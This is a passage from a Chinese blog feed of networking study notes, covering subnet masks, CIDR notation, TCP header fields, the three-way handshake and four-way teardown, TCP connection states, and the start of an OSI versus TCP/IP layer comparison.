src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310300082-e9f6d6a5-26f7-4b9c-a18f-8d4345239c23.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u53197b78&amp;margin=%5Bobject%20Object%5D&amp;name=2727325486-8ff1e4960840413d_fix732.png&amp;originHeight=322&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=65474&amp;status=done&amp;style=none&amp;taskId=u69da4693-b048-4749-b201-a51bddff6ce" alt="2727325486-8ff1e4960840413d_fix732.png"><br>上边对 C 类地址进行了子网的划分，将其划分为 0 和 1 这两个子网，那么对于这个子网，它的子网掩码就是由 25 个 1 和 7 个 0 所组成的，那么这个子网掩码的点分十进制就是 255.255.255.128<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310319190-c908d8a0-43f1-4ee2-b775-0b02201ca941.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=ue64bc5ab&amp;margin=%5Bobject%20Object%5D&amp;name=328930210-365c4e887361e1a9_fix732.png&amp;originHeight=302&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=61943&amp;status=done&amp;style=none&amp;taskId=ue57459cb-c2c8-4c88-a374-79f5d54868a" alt="328930210-365c4e887361e1a9_fix732.png"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="子网掩码是如何进行快速的子网判断的"><a href="#子网掩码是如何进行快速的子网判断的" class="headerlink" title="子网掩码是如何进行快速的子网判断的"></a>子网掩码是如何进行快速的子网判断的</h3><p>假设有 193.10.10.6 这个 IP，首先可以知道它的子网掩码为 255.255.255.128，然后将他们的二进制都表示出来，将他们的每一位进行“与”运算，会得到如下结果<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310353378-28bccf7c-bb16-4c0a-bab3-ae3786f143e0.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u2491d2c1&amp;margin=%5Bobject%20Object%5D&amp;name=322123232-c1cb32980a4bffdb_fix732.png&amp;originHeight=331&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=90353&amp;status=done&amp;style=none&amp;taskId=ube416114-6168-443d-ae32-4bfe42df3a7" alt="322123232-c1cb32980a4bffdb_fix732.png"><br>可以看到，计算的结果就是 193.10.10.0，这个就是该 IP 的子网号<br>再假设有 193.10.10.129 这个 IP，它的子网掩码为 255.255.255.128，然后将他们的二进制都表示出来，将他们的每一位进行“<strong>与</strong>”运算，会得到如下结果<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310377557-26b7154e-376b-4b22-978c-b3d77e2735f4.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=uff00f945&amp;margin=%5Bobject%20Object%5D&amp;name=3139748922-496c7ffdc9a887ee_fix732.png&amp;originHeight=318&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=96213&amp;status=done&amp;style=none&amp;taskId=u7747bb46-db68-4563-9c36-8fa828cc1aa" alt="3139748922-496c7ffdc9a887ee_fix732.png"><br>可以看到，计算的结果就是 193.10.10.128，这个就是该 IP 的子网号<br>所以，<strong>通过子网掩码和 IP 进行与运算，就可以快速得到该 IP 所属的子网号</strong><br><strong>​</strong></p><h2 id="五、无分类编址-CIDR"><a href="#五、无分类编址-CIDR" class="headerlink" title="五、无分类编址 CIDR"></a>五、无分类编址 CIDR</h2><p>由于子网的划分还是比较的复杂，先要知道网络号，然后进行子网号的划分。我们是希望有更好、更简便的划分，去使用 IP 地址，因此就是提出了，<strong>无分类编址 CIDR</strong></p><ul><li>CIDR 中没有 A、B、C 类网络号和子网划分的概念</li><li>CIDR 将<strong>网络前缀</strong>相同的 IP 地址称为一个“<strong>CIDR 地址块</strong>”</li></ul><p>因此，对于 CIDR，它的 IP 地址分为两个部分：<strong>网络前缀</strong>和<strong>主机号</strong>。网络前缀并不是和前边的网络号一样，他们最大的不同就是，<strong>网络前缀的位数是任意的</strong></p><h4 id="斜线记法"><a href="#斜线记法" class="headerlink" title="斜线记法"></a>斜线记法</h4><p>CIDR 在记录的时候，通常使用斜线记法来记录相关的 IP 地址，如：<br>192.10.10.129/25 表示它的网络前缀有 25 位，那么主机号就是七位（<strong>11000001.00001010.00001010.1</strong>0000001）。除了 25 以外，还有很多<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310444465-3183aaeb-a947-43c7-8651-8b05a842eebd.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=ud8c6f319&amp;margin=%5Bobject%20Object%5D&amp;name=2117259349-456e8016555fd8bf_fix732.png&amp;originHeight=369&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=124377&amp;status=done&amp;style=none&amp;taskId=ub3f79241-7da2-4418-88ca-87209f48755" alt="2117259349-456e8016555fd8bf_fix732.png"><br>还是最上边的那个例子：某公司拥有 100 名员工，每人配备一台计算机，请问该公司应该申请哪种网段？<br>如果使用 CIDR 这个记法来进行分配的话，就只需要给它分配一个网络前缀为 25 的 IP 网络号就可以了(/25)<br>假设该公司增加了 100 名员工，并且拆分成两个部门，此时如何进行 IP 的规划？<br>这个时候其实可以为他们分配一个 24 位网络前缀的 IP 地址，然后对于每一个部门都分配 25 位网络前缀的 IP 地址。这里就有小型网络和大型网络的概念了，在 CIDR 中，小型网络通常称为<strong>子网</strong>，对于那个网络前缀为 24 位的，在 CIRDR 中，称为<strong>超网</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310467874-fad08696-0f3c-4eea-8abc-1120121927b7.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u72da92d8&amp;margin=%5Bobject%20Object%5D&amp;name=2171528328-0eeaea609b60f1f5_fix732.png&amp;originHeight=288&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=47475&amp;status=done&amp;style=none&amp;taskId=u11d51e5b-cb71-4ad2-ad0c-de0fb6a1bf2" alt="2171528328-0eeaea609b60f1f5_fix732.png"><br>如果将该例子拓展一下，拓展为某一个城市。如果对一个城市，使用 CIDR 进行网络规划，可能给这个城市分配网络前缀为 18 的网络地址，给该城市中的公司分配网络前缀为 20 的网络地址，对于公司部门，则分配网络前缀为 24 的网络地址<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310482397-36f4be97-7a33-4672-826e-6d2306030629.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u4d1e17ad&amp;margin=%5Bobject%20Object%5D&amp;name=2822284147-1a223d5a8e2f58a0_fix732.png&amp;originHeight=347&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=75153&amp;status=done&amp;style=none&amp;taskId=u26b314b6-b397-48d0-8929-77004936f2a" alt="2822284147-1a223d5a8e2f58a0_fix732.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP/IP协议详解</title>
      <link href="/post/3fc8ae63.html"/>
      <url>/post/3fc8ae63.html</url>
      
        <content type="html"><![CDATA[<h1 id="TCP-IP-协议详解"><a href="#TCP-IP-协议详解" class="headerlink" title="TCP/IP 协议详解"></a>TCP/IP 协议详解</h1><h2 id="一、TCP-端口"><a href="#一、TCP-端口" class="headerlink" title="一、TCP 端口"></a>一、TCP 端口</h2><h3 id="1-端口与进程"><a href="#1-端口与进程" class="headerlink" title="1. 端口与进程"></a>1. 端口与进程</h3><p>TCP 的包是不包含 IP 地址信息的，那是 IP 层上的事，但是有源端口和目的端口。 就是说，端口这一东西，是属于 TCP 知识范畴的。<br>我们知道两个进程，在计算机内部进行通信，可以有管道、内存共享、信号量、消息队列等方法。 而两个进程如果需要进行通讯最基本的一个前提是能够唯一的标识一个进程，在本地进程通讯中我们可以使用<strong>「PID(进程标识符)」</strong> 来唯一标识一个进程。 但 PID 只在本地唯一，如果把两个进程放到了不同的两台计算机，然后他们要通信的话，PID 就不够用了，这样就需要另外一种手段了。<br>解决这个问题的方法就是在运输层使用<strong>「协议端口号 (protocol port number)」</strong>，简称<strong>「端口 (port)」</strong>。 我们知道 IP 层的 ip 地址可以唯一标识主机，而 TCP 层协议和端口号可以唯一标识主机的一个进程，这样我们可以利用：<strong>「ip 地址＋协议＋端口号」</strong>唯一标示网络中的一个进程。 在一些场合，也把这种唯一标识的模式称为<strong>「套接字 (Socket)」</strong>。<br>这就是说，虽然通信的重点是应用进程，但我们只要把要传送的报文交到目的主机的某一个合适的端口，剩下的工作就由 TCP 来完成了。</p><h3 id="2-认识端口"><a href="#2-认识端口" class="headerlink" title="2. 认识端口"></a>2. 认识端口</h3><p>TCP 用一个 16 位端口号来标识一个端口，可允许有 65536 ( 2 的 16 次方) 个不同的端口号，范围在 0 ~ 65535 之间。<br>一些常见的端口号：</p><table><thead><tr><th><strong>应用程序</strong></th><th>FTP</th><th>TELNET</th><th>SMTP</th><th>DNS</th><th>TFTP</th><th>HTTP</th><th>HTTPS</th><th>SNMP</th></tr></thead><tbody><tr><td><strong>熟知端口号</strong></td><td>21</td><td>23</td><td>25</td><td>53</td><td>69</td><td>80</td><td>443</td><td>161</td></tr></tbody></table><h2 id="二、TCP-报文结构"><a href="#二、TCP-报文结构" class="headerlink" title="二、TCP 报文结构"></a>二、TCP 报文结构</h2><p>TCP 是面向字节流的，但传送的数据单元却是报文段。<br><strong>什么是报文？</strong> 例如一个 100kb 的 HTML 文档需要传送到另外一台计算机，并不会整个文档直接传送过去，可能会切割成几个部分，比如四个分别为 25kb 的数据段。 而每个数据段再加上一个 TCP 首部，就组成了 TCP 报文。 一共四个 TCP 报文，发送到另外一个端。 另外一端收到数据包，然后再剔除 TCP 首部，组装起来。 等到四个数据包都收到了，就能还原出来一个完整的 HTML 文档了。<br>在 OSI 的七层协议中，第二层（数据链路层）的数据叫「Frame」，第三层（网络层）上的数据叫「Packet」，第四层（传输层）的数据叫「Segment」。<br>TCP 报文 (Segment)，包括首部和数据部分：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627301281422-ea93eb5a-5a77-4e83-85ea-ea593d5d680d.png#clientId=u5f8f13c6-200a-4&amp;from=paste&amp;height=131&amp;id=u7ab0f987&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%AE%9E%E8%AE%AD%E4%BA%8C.png&amp;originHeight=96&amp;originWidth=282&amp;originalType=binary%E2%88%B6=1&amp;size=5361&amp;status=done&amp;style=none&amp;taskId=ua474028e-5d52-4567-a718-50ccc5b6f64&amp;width=385" alt="实训二.png"><br>而 TCP 的全部功能都体现在它首部中各字段的作用，只有弄清 TCP 首部各字段的作用才能掌握 TCP 的工作原理。 TCP 报文段首部的前 20 个字节是固定的，后面有 4N 字节是根据需要而增加的。 下图是把 TCP 报文中的首部放大来看。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627301461063-ca7ff995-315f-4b67-b301-135da472f17b.png#clientId=u5f8f13c6-200a-4&amp;from=paste&amp;height=440&amp;id=ua56be9a6&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=440&amp;originWidth=720&amp;originalType=binary%E2%88%B6=1&amp;size=29701&amp;status=done&amp;style=none&amp;taskId=ub96d79f1-92cc-4cb7-8fdf-b98509296f1&amp;width=720" alt="image.png"><br>TCP 的首部包括以下内容：</p><ol><li> 源端口 source port</li><li> 目的端口 destination port</li><li> 序号 sequence number</li><li> 确认号 acknowledgment number</li><li> 数据偏移 offset</li><li> 保留 reserved</li><li> 标志位 tcp flags</li><li> 窗口大小 window size</li><li> 检验和 checksum</li><li> 紧急指针 urgent pointer</li><li> 选项 tcp options</li></ol><p>​</p><h3 id="TCP-首部各字段的意义和作用"><a href="#TCP-首部各字段的意义和作用" class="headerlink" title="TCP 首部各字段的意义和作用"></a>TCP 首部各字段的意义和作用</h3><h3 id="01-源端口和目的端口-Port"><a href="#01-源端口和目的端口-Port" class="headerlink" title="01. 源端口和目的端口 Port"></a>01. 源端口和目的端口 Port</h3><p>各占<strong>2</strong>个 字节，共<strong>4</strong>个字节。 用来告知主机该报文段是来自哪里以及传送给哪个应用程序（应用程序绑定了端口）的。 进行 TCP 通讯时，客户端通常使用系统自动选择的临时端口号，而服务器则使用知名服务端口号。</p><h3 id="02-序号-Sequence-Number"><a href="#02-序号-Sequence-Number" class="headerlink" title="02. 序号 Sequence Number"></a>02. 序号 Sequence Number</h3><p>占 <strong>4</strong> 个字节。 TCP 是面向字节流的，在一个 TCP 连接中传输的字节流中的每个字节都按照顺序编号。 例如 100 kb 的 HTML 文档数据，一共 102400 (100 * 1024) 个字节，那么每一个字节就都有了编号，整个文档的编号的范围是 0 ~ 102399。<br>序号字段值指的是<strong>本报文段</strong>所发送的数据的第一个字节的序号。 那么 100 的 HTML 文档分割成四个等分之后， 第一个 TCP 报文段包含的是第一个 25kb 的数据，0 ~ 25599 字节， 该报文的序号的值就是：0 第二个 TCP 报文段包含的是第二个 25kb 的数据，25600 ~ 51199 字节，该报文的序号的值就是：25600 ……<br>根据 8 位 = 1 字节，那么 4 个字节可以表示的数值范围：[0, 2^32]，一共 2^32 (4294967296) 个序号。 序号增加到最大值的时候，下一个序号又回到了 0. 也就是说 TCP 协议可对 4GB 的数据进行编号，在一般情况下可保证当序号重复使用时，旧序号的数据早已经通过网络到达终点或者丢失了。</p><h3 id="03-确认号-Acknowledgemt-Number"><a href="#03-确认号-Acknowledgemt-Number" class="headerlink" title="03. 确认号 Acknowledgemt Number"></a>03. 确认号 Acknowledgemt Number</h3><p>占<strong>4</strong>个字节。 表示<strong>期望收到对方下一个报文段的序号值</strong>。 TCP 的可靠性，是建立在「每一个数据报文都需要确认收到」的基础之上的。 就是说，通讯的任何一方在收到对方的一个报文之后，都要发送一个相对应的「确认报文」，来表达确认收到。<strong>那么，确认报文，就会包含确认号</strong>。 例如，通讯的一方收到了第一个 25kb 的报文，该报文的 序号值=0，那么就需要回复一个<strong>确认报文</strong>，其中的确认号 = 25600.</p><h3 id="04-数据偏移-Offset"><a href="#04-数据偏移-Offset" class="headerlink" title="04. 数据偏移 Offset"></a>04. 数据偏移 Offset</h3><p>占<strong>0.5</strong>个字节 (4 位)。 这个字段实际上是指出了<strong>TCP 报文段的首部长度</strong>，它指出了 TCP 报文段的数据起始处 距离 TCP 报文的起始处 有多远。（注意 数据起始处 和 报文起始处 的意思）<br>一个数据偏移量 = 4 byte，由于 4 位二进制数能表示的最大十进制数字是 15，因此数据偏移的最大值是 60 byte，这也侧面限制了 TCP 首部的最大长度。</p><h3 id="05-保留-Reserved"><a href="#05-保留-Reserved" class="headerlink" title="05. 保留 Reserved"></a>05. 保留 Reserved</h3><p>占 <strong>0.75</strong> 个字节 (6 位)。 保留为今后使用，但目前应置为 0。</p><h3 id="06-标志位-TCP-Flags"><a href="#06-标志位-TCP-Flags" class="headerlink" title="06. 标志位 TCP Flags"></a>06. 标志位 TCP Flags</h3><p>标志位，一共有 6 个，分别占 1 位，共 6 位 。 每一位的值只有 0 和 1，分别表达不同意思。<br><strong>紧急 URG (Urgent)</strong><br>当 <code>URG = 1</code> 的时候，表示紧急指针（Urgent Pointer）有效。 它告诉系统此报文段中有紧急数据，应尽快传送，而不要按原来的排队顺序来传送。 URG 要与首部中的 紧急指针 字段配合使用。<br><strong>确认 ACK (Acknowlegemt)</strong><br>当 <code>ACK = 1</code> 的时候，确认号（Acknowledgemt Number）有效。 一般称携带 ACK 标志的 TCP 报文段为「确认报文段」。 TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 设置为 1。<br><strong>推送 PSH (Push)</strong><br>当 <code>PSH = 1</code> 的时候，表示该报文段高优先级，接收方 TCP 应该尽快推送给接收应用程序，而不用等到整个 TCP 缓存都填满了后再交付。<br><strong>复位 RST (Reset)</strong><br>当 <code>RST = 1</code> 的时候，表示 TCP 连接中出现严重错误，需要释放并重新建立连接。 一般称携带 RST 标志的 TCP 报文段为「复位报文段」。<br><strong>同步 SYN (SYNchronization)</strong><br>当 <code>SYN = 1</code> 的时候，表明这是一个请求连接报文段。 一般称携带 SYN 标志的 TCP 报文段为「同步报文段」。 在 TCP 三次握手中的第一个报文就是同步报文段，在连接建立时用来同步序号。 对方若同意建立连接，则应在响应的报文段中使 SYN = 1 和 ACK = 1。<br><strong>终止 FIN (Finis)</strong><br>当 <code>FIN = 1</code> 时，表示此报文段的发送方的数据已经发送完毕，并要求释放 TCP 连接。 一般称携带 FIN 的报文段为「结束报文段」。 在 TCP 四次挥手释放连接的时候，就会用到该标志。</p><h3 id="07-窗口大小-Window-Size"><a href="#07-窗口大小-Window-Size" class="headerlink" title="07. 窗口大小 Window Size"></a>07. 窗口大小 Window Size</h3><p>占 <strong>2</strong> 字节。 该字段明确指出了现在允许对方发送的数据量，它告诉对方本端的 TCP 接收缓冲区还能容纳多少字节的数据，这样对方就可以控制发送数据的速度。 窗口大小的值是指，从本报文段首部中的确认号算起，接收方目前允许对方发送的数据量。 例如，假如确认号是 701 ，窗口字段是 1000。这就表明，从 701 号算起，发送此报文段的一方还有接收 1000 （字节序号是 701 ~ 1700） 个字节的数据的接收缓存空间。</p><h3 id="08-校验和-TCP-Checksum"><a href="#08-校验和-TCP-Checksum" class="headerlink" title="08. 校验和 TCP Checksum"></a>08. 校验和 TCP Checksum</h3><p>占 <strong>2</strong> 个字节。 由发送端填充，接收端对 TCP 报文段执行 CRC 算法，以检验 TCP 报文段在传输过程中是否损坏，如果损坏这丢弃。 检验范围包括首部和数据两部分，这也是 TCP 可靠传输的一个重要保障。</p><h3 id="09-紧急指针-Urgent-Pointer"><a href="#09-紧急指针-Urgent-Pointer" class="headerlink" title="09. 紧急指针 Urgent Pointer"></a>09. 紧急指针 Urgent Pointer</h3><p>占 <strong>2</strong>个字节。 仅在 URG = 1 时才有意义，它指出本报文段中的紧急数据的字节数。 当 URG = 1 时，发送方 TCP 就把紧急数据插入到本报文段数据的<strong>最前面</strong>，而在紧急数据后面的数据仍是普通数据。 因此，紧急指针指出了紧急数据的末尾在报文段中的位置。</p><h2 id="三、TCP-连接的建立和释放"><a href="#三、TCP-连接的建立和释放" class="headerlink" title="三、TCP 连接的建立和释放"></a>三、TCP 连接的建立和释放</h2><h3 id="1-TCP-的连接"><a href="#1-TCP-的连接" class="headerlink" title="1. TCP 的连接"></a>1. TCP 的连接</h3><p>TCP 的整个交流过程可以总结为：先建立连接，然后传输数据，最后释放连接。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627302229893-fd99ba2f-f93d-46b7-b9ae-b645e528f0ca.png#clientId=u30d4f1b7-5f72-4&amp;from=paste&amp;height=96&amp;id=u9589c535&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%AE%9E%E8%AE%AD%E4%BA%8C%20%281%29.png&amp;originHeight=96&amp;originWidth=576&amp;originalType=binary%E2%88%B6=1&amp;size=10436&amp;status=done&amp;style=none&amp;taskId=ue1fb9282-8a11-4b8b-8243-b1efd24bba0&amp;width=576" alt="实训二 (1).png"><br>详细过程：<br><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627388467966-e492a08d-ffa5-4f11-931e-88d36b5ec382.jpeg#clientId=u23b20a01-81ed-4&amp;from=drop&amp;id=u93ac234d&amp;margin=%5Bobject%20Object%5D&amp;name=image.jpeg&amp;originHeight=910&amp;originWidth=680&amp;originalType=binary%E2%88%B6=1&amp;size=66393&amp;status=done&amp;style=none&amp;taskId=u494b5401-9eb8-4b76-bafd-3977ea7e390" alt="image.jpeg"></p><h3 id="2、三次握手，建立连接"><a href="#2、三次握手，建立连接" class="headerlink" title="2、三次握手，建立连接"></a>2、三次握手，建立连接</h3><p>TCP 连接建立要解决的首要问题就是：<strong>要使每一方能够确知对方的存在。</strong><br><strong>​</strong></p><p>三次握手就像，在一个黑暗的森林，你知道前方十点钟方向好像有人。<br>你喊了一句：Hello？I’am JerryC，Who are you？<br>对面回了一句：Hi! I’am David, and nice to meet you!<br>然后你回了一句：Nice to meet you too! ……(自此，你们才算真正认识了双方，开始了后面省略 3000 字的谈话)<br>​</p><p>所以说，两个人需要交朋友（两个端点需要建立连接），至少需要三次的通话（握手）。<br>​</p><p>其实，网络上的传输是没有连接的，TCP 也是一样的。<br>而 TCP 所谓的「连接」，其实只不过是在通信的双方维护一个「连接状态」，让它看上去好像有连接一样。<br>​</p><h4 id="连接建立过程"><a href="#连接建立过程" class="headerlink" title="连接建立过程"></a>连接建立过程</h4><p>TCP 连接的建立采用客户服务器方式，主动发起连接建立的一方叫<strong>客户端（Client）</strong>，被动等待连接建立的一方叫<strong>服务器（Server）</strong>。<br>​</p><p>最初的时候，两端都处于<strong>CLOSED</strong>的状态，然后服务器打开了 TCP 服务，进入<strong>LISTEN</strong>状态，监听特定端口，等待客户端的 TCP 请求。<br>​</p><p><strong>第一次握手</strong>： 客户端主动打开连接，发送 TCP 报文，进行第一次握手，然后进入 SYN_SEND 状态，等待服务器发回确认报文。 这时首部的同步位 SYN = 1，同时初始化一个序号 Sequence Number = J。 TCP 规定，SYN 报文段不能携带数据，但会消耗一个序号。<br>​</p><p><strong>第二次握手</strong>： 服务器收到了 SYN 报文，如果同意建立连接，则向客户端发送一个确认报文，然后服务器进入<strong>SYN_RCVD</strong> 状态。 这时首部的 SYN = 1，ACK = 1，而确认号 Acknowledgemt Number = J + 1，同时也为自己初始化一个序号 Sequence Number = K。 这个报文同样不携带数据。<br>​</p><p><strong>第三次握手</strong>： 客户端收到了服务器发过来的确认报文，还要向服务器给出确认，然后进入<strong>ESTABLISHED</strong>状态。 这时首部的 SYN 不再置为 1，而 ACK = 1，确认号 Acknowledgemt Number = K + 1，序号 Sequence Number = J + 1。 第三次握手，一般会携带真正需要传输的数据，当服务器收到该数据报文的时候，就会同样进入<strong>ESTABLISHED</strong>状态。 此时，TCP 连接已经建立。<br>​</p><p>对于建立连接的三次握手，主要目的是初始化序号 Sequence Number，并且通信的双方都需要告知对方自己的初始化序号，所以这个过程也叫 SYN。 这个序号要作为以后的数据通信的序号，以保证应用层接收到的数据不会因为网络上的传输问题而乱序，因为 TCP 会用这个序号来拼接数据。<br>​</p><h4 id="利用连接设计缺陷实施-TCP-Flood-攻击"><a href="#利用连接设计缺陷实施-TCP-Flood-攻击" class="headerlink" title="利用连接设计缺陷实施 TCP Flood 攻击"></a>利用连接设计缺陷实施 TCP Flood 攻击</h4><p>知道了 TCP 建立一个连接，需要进行三次握手。<br>但如果你开始思考「三次握手的必要性」的时候，就会知道，其实网络是很复杂的，一个信息在途中丢失的可能性是有的。<br>如果数据丢失了，那么，就需要重新发送，这时候就要知道数据是否真的送达了。 这就是三次握手的必要性。<br>但是再向深一层思考，你给我发信息，我收到了，我回复，因为我是君子。<br>如果是小人，你给我发信息，我就算收到了，我也不回复，你就一直等我着我的回复。<br>那么很多小人都这样做，你就要一直记住你在等待着小人 1 号、小人 2 号、小人 3 号……直到你的脑容量爆棚，烧坏脑袋。<br>黑客就是利用这样的设计缺陷，实施 TCP Flood 攻击，属于 DDOS 攻击的一种。</p><h3 id="3、四次挥手，释放连接"><a href="#3、四次挥手，释放连接" class="headerlink" title="3、四次挥手，释放连接"></a>3、四次挥手，释放连接</h3><p>TCP 有一个特别的概念叫做<strong>半关闭</strong>，这个概念是说，TCP 的连接是全双工（可以同时发送和接收）的连接，因此在关闭连接的时候，必须关闭传送和接收两个方向上的连接。 客户端给服务器发送一个携带 FIN 的 TCP 结束报文段，然后服务器返回给客户端一个 确认报文段，同时发送一个 结束报文段，当客户端回复一个 确认报文段 之后，连接就结束了。<br>​</p><h4 id="释放连接过程"><a href="#释放连接过程" class="headerlink" title="释放连接过程"></a>释放连接过程</h4><p>在结束之前，通信双方都是处于 <strong>ESTABLISHED</strong> 状态，然后其中一方主动断开连接。 下面假如客户端先主动断开连接。<br>​</p><p><strong>第一次挥手：</strong>客户端向服务器发送结束报文段，然后进入<strong>FIN_WAIT_1</strong>状态。 此报文段 FIN = 1， Sequence Number = M。<br>​</p><p><strong>第二次挥手：</strong>服务端收到客户端的结束报文段，然后发送确认报文段，进入<strong>CLOSE_WAIT</strong>状态。 此报文段 ACK = 1， Sequence Number = M + 1。<br>客户端收到该报文，会进入 <strong>FIN_WAIT_2</strong> 状态。<br>​</p><p><strong>第三次挥手：</strong>同时服务端向客户端发送结束报文段，然后进入<strong>LAST_ACK</strong>状态。 此报文段 FIN = 1，Sequence Number = N。<br>​</p><p><strong>第四次挥手：</strong>客户端收到服务端的结束报文段，然后发送确认报文段，进入<strong>TIME_WAIT</strong>状态，经过 2MSL 之后，自动进入<strong>CLOSED</strong>状态。 此报文段 ACK = 1, Sequence Number = N + 1。<br>​</p><p>服务端收到该报文之后，进入 <strong>CLOSED</strong> 状态。<br>​</p><p><strong>关于 TIME_WAIT 过渡到 CLOSED 状态说明</strong>： 从<strong>TIME_WAIT</strong>进入<strong>CLOSED</strong>需要经过 2MSL，其中 MSL 就叫做 最长报文段寿命（Maxinum Segment Lifetime），根据 RFC 793 建议该值这是为 2 分钟，也就是说需要经过 4 分钟，才进入<strong>CLOSED</strong>状态。</p><h2 id="四、TCP-状态流转"><a href="#四、TCP-状态流转" class="headerlink" title="四、TCP 状态流转"></a>四、TCP 状态流转</h2><p>无论客户端还是服务器，在双方 TCP 通讯的过程中，都会有着一个「状态」的概念，状态会随着 TCP 通讯的不同阶段而变化。</p><h3 id="1-TCP-状态流转图"><a href="#1-TCP-状态流转图" class="headerlink" title="1. TCP 状态流转图"></a>1. TCP 状态流转图</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627388566322-c022f200-3986-45a0-b1f1-366417c5c26c.jpeg#clientId=ucabfc325-94fa-4&amp;from=drop&amp;id=u647c9220&amp;margin=%5Bobject%20Object%5D&amp;name=image%20%281%29.jpeg&amp;originHeight=812&amp;originWidth=846&amp;originalType=binary%E2%88%B6=1&amp;size=75494&amp;status=done&amp;style=none&amp;taskId=u1629fcf5-0681-4047-bb09-8dc5102ed40" alt="image (1).jpeg"></p><h3 id="2-各种状态表示的意思"><a href="#2-各种状态表示的意思" class="headerlink" title="2. 各种状态表示的意思"></a>2. 各种状态表示的意思</h3><p><strong>CLOSED</strong>：表示初始状态<br><strong>LISTEN</strong>：表示服务器端的某个 socket 处于监听状态，可以接受连接<br><strong>SYN_SENT</strong>：在服务端监听后，客户端 socket 执行 CONNECT 连接时，客户端发送 SYN 报文，此时客户端就进入 SYN_SENT 状态，等待服务端确认。<br><strong>SYN_RCVD</strong>：表示服务端接收到了 SYN 报文。<br><strong>ESTABLISHED</strong>：表示连接已经建立了。<br><strong>FIN_WAIT_1</strong>：其中一方请求终止连接，等待对方的 FIN 报文。<br><strong>FIN_WAIT_2</strong>：在<strong>FIN_WAIT_2</strong> 之后， 当对方回应 ACK 报文之后，进入该状态。<br><strong>TIME_WAIT</strong>：表示收到了对方的 FIN 报文，并发送出了 ACK 报文，就等 2MSL 之后即可回到 CLOSED 状态。<br><strong>CLOSING</strong>：一种罕见状态，发生在发送 FIN 报文之后，本应是先收到 ACK 报文，却先收到对方的 FIN 报文，那么就从 FIN_WAIT_1 的状态进入 CLOSING 状态。<br><strong>CLOSE_WAIT</strong>：表示等待关闭，在 ESTABLISHED 过渡到 LAST_ACK 的一个过渡阶段，该阶段需要考虑是否还有数据发送给对方，如果没有，就可以关闭连接，发送 FIN 报文，然后进入 LAST_ACK 状态。<br><strong>LAST_ACK</strong>：被动关闭一方发送 FIN 报文之后，最后等待对方的 ACK 报文所处的状态。<br><strong>CLOSED</strong>：当收到 ACK 保温后，就可以进入 CLOSED 状态了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSI七层和TCP/IP四层的关系</title>
      <link href="/post/1fac9017.html"/>
      <url>/post/1fac9017.html</url>
      
        <content type="html"><![CDATA[<h1 id="OSI-七层和-TCP-IP-四层的关系"><a href="#OSI-七层和-TCP-IP-四层的关系" class="headerlink" title="OSI 七层和 TCP/IP 四层的关系"></a>OSI 七层和 TCP/IP 四层的关系</h1><h2 id="一、基本关系"><a href="#一、基本关系" class="headerlink" title="一、基本关系"></a>一、基本关系</h2><ol><li>OSI 引入了服务、接口、协议、分层的概念，TCP/IP 借鉴了 OSI 的这些概念建立 TCP/IP 模型。</li><li>OSI 先有模型，后有协议，先有标准，后进行实践；而 TCP/IP 则相反，先有协议和应用再提出了模型，且是参照的 OSI 模型。</li><li>OSI 是一种理论下的模型，而 TCP/IP 已被广泛使用，成为网络互联事实上的标准。</li></ol><p>​</p><h2 id="二、对应关系"><a href="#二、对应关系" class="headerlink" title="二、对应关系"></a>二、对应关系</h2><p>TCP/IP 和 OSI 模型组并不能精确的匹配，但是我们可以尽可能的参考 OSI 模型并在其中找到 TCP/IP 的对应位置。</p><table><thead><tr><th><strong>OSI 七层</strong></th><th><strong>TCP/IP 四层</strong></th><th><strong>常用网络协议</strong></th></tr></thead><tbody><tr><td>应用层（Application）</td><td>应用层</td><td>HTTP、TFTP、FTP、NFS、WAIS、SMTP</td></tr><tr><td>表示层（Presentation）</td><td></td><td>Telnet、Rlogin、SNMP、Gopher</td></tr><tr><td>会话层（Session）</td><td></td><td>SMTP、DNS</td></tr><tr><td>传输层（Transport）</td><td>传输层</td><td>TCP、UDP</td></tr><tr><td>网络层（Network）</td><td>网络层</td><td>IP、ICMP、ARP、RARP、AKP、UUCP</td></tr><tr><td>数据链路层（Data Link）</td><td>数据链路层</td><td>FDDI、Ethernet、Arpanet、PDN、SLIP、PPP</td></tr><tr><td>物理层（Physical）</td><td></td><td>IEEE 802.1A、IEEE 802.2 到 IEEE 802.11</td></tr></tbody></table><p><img 